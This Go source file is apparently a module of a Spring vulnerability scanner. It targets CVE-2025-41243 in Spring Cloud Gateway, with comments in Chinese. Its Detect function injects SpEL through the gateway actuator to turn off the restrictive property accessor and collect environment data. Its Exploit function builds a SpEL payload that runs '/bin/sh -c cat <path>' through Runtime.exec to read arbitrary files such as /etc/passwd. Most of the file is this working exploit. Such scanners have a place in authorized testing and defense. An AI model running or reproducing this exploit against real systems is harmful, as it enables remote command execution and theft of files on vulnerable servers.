package vulns

import (
	"context"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2025-41243 Spring Cloud Gateway Server WebFlux SpEL 环境属性修改。
//
// 原理：路由 filter 的 SpEL 求值允许"赋值"原语，攻击者可先关闭
// spring.cloud.gateway.restrictive-property-accessor.enabled 开关，
// 再利用完整 SpEL 能力（如改写 resourceHandlerMapping 实现任意文件读取）。
// 补丁版本（4.3.1/4.2.5/4.1.11/3.1.11）在 GatewayEvaluationContext 中
// 禁止了赋值操作，求值会抛 SpelEvaluationException。
//
// 检测与利用均会临时修改网关内存状态，结束后恢复默认值。
type cve202541243 struct{}

func init() { Register(&cve202541243{}) }

const (
	gwSpProbeRoute  = "actuator/gateway/routes/ssp41243probe"
	gwSpFSRoute     = "actuator/gateway/routes/ssp41243fs"
	gwSpRefreshPath = "actuator/gateway/refresh"
	gwSpMarker      = "SSPPROBE"
	restrictiveSpEL = `@systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled']`
)

var gwSpJSONHeaders = map[string]string{"Content-Type": "application/json"}

func (c *cve202541243) Info() model.Info {
	return model.Info{
		ID:         "CVE-2025-41243",
		Name:       "Spring Cloud Gateway SpEL 环境属性修改",
		Type:       "PropertyModification",
		Severity:   "critical",
		Affected:   "Spring Cloud Gateway Server WebFlux 4.3.0 / 4.2.0-4.2.4 / 4.1.0-4.1.10 / ≤3.1.10（gateway actuator 暴露且未加固）",
		Reference:  "https://spring.io/security/cve-2025-41243",
		HasExploit: true,
		ArgHint:    "要读取的文件绝对路径，如 /etc/passwd",
	}
}

// gwRouteJSON 构造单 filter 探测路由，value 为求值表达式。
func gwRouteJSON(id, value string) string {
	return fmt.Sprintf(`{"id":"%s","uri":"http://localhost:80","predicates":[{"name":"Path","args":{"_genkey_0":"/ssp41243probe/**"}}],"filters":[{"name":"AddResponseHeader","args":{"name":"X-SSP-Probe","value":"%s"}}]}`,
		id, value)
}

// restoreFlag 将 restrictive 开关恢复为默认的 true 并清理探测路由。
func (c *cve202541243) restoreFlag(ctx context.Context, t model.Target) {
	restore := gwRouteJSON("ssp41243probe", `#{`+restrictiveSpEL+` = 'true'}`)
	_, _, _ = do(ctx, t, http.MethodPost, gwSpProbeRoute, gwSpJSONHeaders, restore)
	_, _, _ = do(ctx, t, http.MethodPost, gwSpRefreshPath, gwSpJSONHeaders, "")
	_, _, _ = do(ctx, t, http.MethodDelete, gwSpProbeRoute, gwSpJSONHeaders, "")
	_, _, _ = do(ctx, t, http.MethodPost, gwSpRefreshPath, gwSpJSONHeaders, "")
}

func (c *cve202541243) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	// filter1：利用赋值原语关闭 restrictive 开关（补丁版在此抛异常）
	// filter2：读取 java.home 并拼接标记，用于区分"已求值"与"未求值"
	route := fmt.Sprintf(`{"id":"ssp41243probe","uri":"http://localhost:80","predicates":[{"name":"Path","args":{"_genkey_0":"/ssp41243probe/**"}}],"filters":[` +
		`{"name":"AddResponseHeader","args":{"name":"X-SSP-Assign","value":"#{` + restrictiveSpEL + ` = 'false'}"}},` +
		`{"name":"AddResponseHeader","args":{"name":"X-SSP-Marker","value":"#{'` + gwSpMarker + `' + @systemProperties['java.home']}"}}]}`)

	resp, _, err := do(ctx, t, http.MethodPost, gwSpProbeRoute, gwSpJSONHeaders, route)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode == http.StatusNotFound {
		// gateway actuator 端点未暴露，触发条件不成立
		return v, nil
	}
	_, _, _ = do(ctx, t, http.MethodPost, gwSpRefreshPath, gwSpJSONHeaders, "")

	resp, body, err := do(ctx, t, http.MethodGet, gwSpProbeRoute, gwSpJSONHeaders, "")
	c.restoreFlag(ctx, t)
	if err != nil {
		return nil, err
	}

	b := string(body)
	evaluated := resp.StatusCode == http.StatusOK &&
		strings.Contains(b, gwSpMarker) &&
		!strings.Contains(b, "#{") &&
		!strings.Contains(b, "SpelEvaluationException")

	if evaluated {
		v.Vulnerable = true
		if i := strings.Index(b, gwSpMarker); i >= 0 {
			rest := b[i+len(gwSpMarker):]
			if j := strings.IndexAny(rest, `"'\\`); j >= 0 {
				v.Evidence = "java.home = " + rest[:j]
			}
		}
		v.Detail = "SpEL 赋值原语可用（restrictive 开关已被关闭并在结束后恢复），可进一步任意文件读取"
		if env := c.probeEnvironment(ctx, t); env != "" {
			v.Detail += "；属性源: " + env
		}
	}
	return v, nil
}

// probeEnvironment 用独立的探针路由导出目标环境的属性源清单，
// 丰富 41243 的信息泄露证据；任何失败静默返回空串。
func (c *cve202541243) probeEnvironment(ctx context.Context, t model.Target) string {
	const envRoute = "actuator/gateway/routes/ssp41243env"
	rd := fmt.Sprintf(`{"id":"ssp41243env","uri":"http://localhost:80","predicates":[{"name":"Path","args":{"_genkey_0":"/ssp41243probe/**"}}],"filters":[{"name":"AddResponseHeader","args":{"name":"X-SSP-Env","value":"#{\"SSPENV\" + @environment.getPropertySources.![#this.name].toString()}"}}]}`)
	if _, _, err := do(ctx, t, http.MethodPost, envRoute, gwSpJSONHeaders, rd); err != nil {
		return ""
	}
	_, _, _ = do(ctx, t, http.MethodPost, gwSpRefreshPath, gwSpJSONHeaders, "")
	resp, body, err := do(ctx, t, http.MethodGet, envRoute, gwSpJSONHeaders, "")
	_, _, _ = do(ctx, t, http.MethodDelete, envRoute, gwSpJSONHeaders, "")
	_, _, _ = do(ctx, t, http.MethodPost, gwSpRefreshPath, gwSpJSONHeaders, "")
	if err != nil || resp.StatusCode != http.StatusOK {
		return ""
	}
	b := string(body)
	if i := strings.Index(b, "SSPENV"); i >= 0 {
		rest := b[i+len("SSPENV"):]
		if j := strings.IndexAny(rest, `"'`); j >= 0 {
			env := rest[:j]
			if len(env) > 200 {
				env = env[:200] + "..."
			}
			return env
		}
	}
	return ""
}

// Exploit 的 arg 为要读取的文件绝对路径（如 /etc/passwd）。
// 利用链：赋值关闭 restrictive-property-accessor -> SpEL 内经
// Runtime.exec 执行 cat 读取文件（StreamUtils 拷贝回显进路由定义）。
// 结束后恢复 restrictive 开关并删除利用路由。
func (c *cve202541243) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	const fsRoute = "actuator/gateway/routes/ssp41243fs"

	esc := strings.NewReplacer(`\`, `\\`, `"`, `\"`, "`", "").Replace(arg)
	// 用标记包裹命令输出：输出为空时配置值仍非空，避免网关 @NotEmpty 校验拒载路由
	expr := `#{"SSPBEGIN" + new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","cat ` + esc + `"}).getInputStream())) + "SSPEND"}`
	route := fmt.Sprintf(`{"id":"ssp41243fs","uri":"http://localhost:80","predicates":[{"name":"Path","args":{"_genkey_0":"/ssp41243probe/**"}}],"filters":[`+
		`{"name":"AddResponseHeader","args":{"name":"X-SSP-Assign","value":"#{@systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = 'false'}"}},`+
		`{"name":"AddResponseHeader","args":{"name":"X-SSP-Read","value":%s}}]}`,
		strconv.Quote(expr))

	resp, _, err := do(ctx, t, http.MethodPost, gwSpFSRoute, gwSpJSONHeaders, route)
	if err != nil {
		return "", "", err
	}
	if resp.StatusCode == http.StatusNotFound {
		return "", "gateway actuator 端点未暴露，无法利用", nil
	}
	_, _, _ = do(ctx, t, http.MethodPost, gwSpRefreshPath, gwSpJSONHeaders, "")

	// 回读路由：refresh 后缓存重建存在短暂延迟，重试等路由就绪
	var s2 int
	var routeBody []byte
	for i := 0; i < 5; i++ {
		resp2, rb, err := do(ctx, t, http.MethodGet, gwSpFSRoute, gwSpJSONHeaders, "")
		if err != nil {
			return "", "", err
		}
		s2, routeBody = resp2.StatusCode, rb
		if s2 == http.StatusOK {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	// 清理：删除路由并恢复 restrictive 开关
	_, _, _ = do(ctx, t, http.MethodDelete, gwSpFSRoute, gwSpJSONHeaders, "")
	_, _, _ = do(ctx, t, http.MethodPost, gwSpRefreshPath, gwSpJSONHeaders, "")
	c.restoreFlag(ctx, t)

	if s2 != http.StatusOK {
		return "", "利用路由加载失败：表达式被网关拒绝（可能已打补丁或网关版本不支持）", nil
	}

	body := string(routeBody)
	// 提取 SSPBEGIN 与 SSPEND 标记之间的文件内容（空输出时标记间为空）
	if i := strings.Index(body, "SSPBEGIN"); i >= 0 {
		rest := body[i+len("SSPBEGIN"):]
		if j := strings.Index(rest, "SSPEND"); j >= 0 {
			content := rest[:j]
			if strings.TrimSpace(content) == "" {
				return "", "命令无输出（文件可能不存在或为空）", nil
			}
			return strings.ReplaceAll(content, `\n`, "\n"), "文件内容提取自路由回读响应；restrictive 开关已恢复", nil
		}
	}
	// 回读格式随网关版本不同：JSON 字段形态或字符串化的路由定义形态
	for _, m := range []struct{ start, end string }{
		{"X-SSP-Read = '", "'"},
		{`"X-SSP-Read","value":"`, `"`},
	} {
		if i := strings.Index(body, m.start); i >= 0 {
			rest := body[i+len(m.start):]
			if j := strings.Index(rest, m.end); j >= 0 {
				return rest[:j], "文件内容提取自路由回读响应；restrictive 开关已恢复", nil
			}
		}
	}
	return body, "未能结构化提取文件内容，已返回原始响应", nil
}
